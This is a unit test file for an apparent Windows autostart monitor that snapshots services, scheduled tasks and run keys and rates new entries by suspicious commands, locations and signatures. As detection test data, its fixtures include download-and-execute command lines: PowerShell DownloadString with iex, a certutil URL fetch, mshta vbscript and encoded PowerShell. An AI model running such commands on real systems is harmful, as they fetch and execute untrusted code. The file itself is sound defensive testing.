"""Unit tests for the autostart snapshot and its assessment. Run: python tests/test_persistence.py (or pytest)."""
import tempfile
import time
from pathlib import Path

from pcassist import ack, binaries, db, persistence, tools

BS = chr(92)
binaries.RISKY_DIRS = (BS + "dl_risky" + BS,)   # the temp folders of these tests live under Temp, which the real list flags


def W(*parts) -> str:
    return BS.join(parts)


def _item(kind, name, command, detail=""):
    return {"kind": kind, "name": name, "command": command, "detail": detail}


def _conn():
    root = Path(tempfile.mkdtemp())
    return root, db.connect(root / "t.db")


def _file(root: Path, *parts) -> str:
    p = root.joinpath(*parts)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(b"MZ")
    return str(p)


def test_the_first_snapshot_is_only_a_baseline():
    root, conn = _conn()
    base = [_item("scheduled_task", W("", "Old"), "C:" + BS + "Windows" + BS + "x.exe"), _item("service", "Svc", "C:" + BS + "Windows" + BS + "y.exe")]
    assert persistence.snapshot(conn, now=1000.0, reader=lambda: base) == 2
    r = persistence.assess(conn, 0)
    assert r["available"] and r["new_or_changed"] == [] and r["entries_known"] == {"scheduled_task": 1, "service": 1}
    assert persistence.assess(db.connect(root / "empty.db"), 0)["available"] is False


def test_a_failed_read_records_nothing_and_never_means_everything_was_removed():
    root, conn = _conn()
    assert persistence.snapshot(conn, now=1000.0, reader=lambda: []) == 0
    assert persistence.last_snapshot(conn) is None


def test_new_entries_are_flagged_by_what_they_do_and_where_they_live():
    root, conn = _conn()
    persistence.snapshot(conn, now=1000.0, reader=lambda: [_item("service", "Known", W("C:", "Windows", "k.exe"))])
    dropper = _file(root, "Users", "x", "dl_risky", "setup.exe")
    plain = _file(root, "Program Files", "Tool", "tool.exe")
    signed = _file(root, "Program Files", "Good", "good.exe")
    new = [_item("service", "Known", W("C:", "Windows", "k.exe")),
           _item("scheduled_task", W("", "Updater"), "powershell.exe -NoProfile -enc " + "QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQ=="),
           _item("run_key", "Dropper", '"' + dropper + '" /silent'),
           _item("run_key", "Plain", plain),
           _item("run_key", "Good", signed)]
    persistence.snapshot(conn, now=2000.0, reader=lambda: new)
    statuses = {plain: ("NotSigned", ""), signed: ("Valid", "CN=Good"), dropper: ("NotSigned", "")}
    r = persistence.assess(conn, 0, checker=lambda paths: {p: statuses[p] for p in paths})
    by = {x["name"]: x for x in r["new_or_changed"]}
    assert set(by) == {W("", "Updater"), "Dropper", "Plain", "Good"}                # "Known" is not new
    assert by[W("", "Updater")]["severity"] == "high" and "encoded PowerShell" in " ".join(by[W("", "Updater")]["reasons"])
    assert by["Dropper"]["severity"] == "high" and "dl_risky" in " ".join(by["Dropper"]["reasons"])
    assert by["Plain"]["severity"] == "medium" and by["Plain"]["signature"] == "NotSigned"
    assert by["Good"]["severity"] == "low" and r["high"] == 2
    assert [x["severity"] for x in r["new_or_changed"]] == ["high", "high", "medium", "low"]   # worst first


def test_a_changed_command_is_reported_with_what_it_replaced_and_a_broken_signature_is_high():
    root, conn = _conn()
    old_exe, new_exe = _file(root, "Program Files", "A", "a.exe"), _file(root, "Program Files", "A", "a2.exe")
    persistence.snapshot(conn, now=1000.0, reader=lambda: [_item("run_key", "Helper", old_exe)])
    persistence.snapshot(conn, now=2000.0, reader=lambda: [_item("run_key", "Helper", new_exe)])
    r = persistence.assess(conn, 0, checker=lambda paths: {p: ("HashMismatch", "CN=X") for p in paths})
    x = r["new_or_changed"][0]
    assert x["changed_from"] == old_exe and x["severity"] == "high" and "changed after it was signed" in " ".join(x["reasons"])


def test_an_old_entry_that_already_looks_bad_is_listed_separately():
    root, conn = _conn()
    persistence.snapshot(conn, now=1000.0, reader=lambda: [
        _item("scheduled_task", W("", "Sneaky"), 'wscript.exe //B "' + W("C:", "Users", "x", "AppData", "Roaming", "y", "run.vbs") + '"'),
        _item("service", "Fine", W("C:", "Windows", "fine.exe"))])
    r = persistence.assess(conn, 0)
    assert r["new_or_changed"] == [] and [x["name"] for x in r["already_present_but_suspicious"]] == [W("", "Sneaky")]
    assert "script host" in " ".join(r["already_present_but_suspicious"][0]["reasons"])


def test_the_file_a_command_starts_is_found_in_the_usual_shapes():
    cases = {
        '"' + W("C:", "Program Files", "A B", "x.exe") + '" --flag': W("C:", "Program Files", "A B", "x.exe"),
        W("C:", "Program Files", "A B", "x.exe") + " -k netsvcs": W("C:", "Program Files", "A B", "x.exe"),
        W("C:", "Windows", "System32", "wscript.exe") + " //B " + W("C:", "x", "y.vbs"): W("C:", "Windows", "System32", "wscript.exe"),
        "<COM handler>": None, "": None, "cmd /c echo hi": None,
    }
    for cmd, expected in cases.items():
        assert persistence.command_exe(cmd) == expected, cmd


def test_suspicious_patterns_fire_and_ordinary_commands_do_not():
    hits = {"powershell -c iex (New-Object Net.WebClient).DownloadString('x')": "downloads",
            "mshta.exe vbscript:Close(Execute(...))": "mshta",
            "certutil -urlcache -f http://x/a.exe a.exe": "download / decode",
            "cmd /c start http://example.com/a": "web address",
            "cscript.exe " + W("C:", "a", "b.js"): "script host"}
    for cmd, word in hits.items():
        reasons, _ = persistence._reasons("n", cmd)
        assert any(word in r for r in reasons), (cmd, reasons)
    assert persistence._reasons("n", '"' + W("C:", "Program Files", "Ok", "ok.exe") + '" --autostart')[0] == []


def test_the_tool_reports_accepts_and_counts_only_open_high_entries():
    root, _ = _conn()
    path = root / "t.db"
    tools.set_db(path)
    conn = db.connect(path)
    persistence.snapshot(conn, now=time.time() - 3600, reader=lambda: [_item("service", "Known", W("C:", "Windows", "k.exe"))])
    task = _item("scheduled_task", W("", "Updater"), "powershell.exe -enc " + "QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQ==")
    persistence.snapshot(conn, now=time.time() - 30, reader=lambda: [_item("service", "Known", W("C:", "Windows", "k.exe")), task])
    r = tools.startup_changes(24)
    assert r["high"] == 1 and "1 new or changed" in r["summary"] and r["new_or_changed"][0]["accepted"] is False
    ack.acknowledge(path, "autorun:scheduled_task:" + W("", "Updater"), "my own script")
    r = tools.startup_changes(24)
    assert r["high"] == 0 and r["new_or_changed"][0]["accepted"] and r["new_or_changed"][0]["accepted_note"] == "my own script"


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            fn()
            print("ok", name)
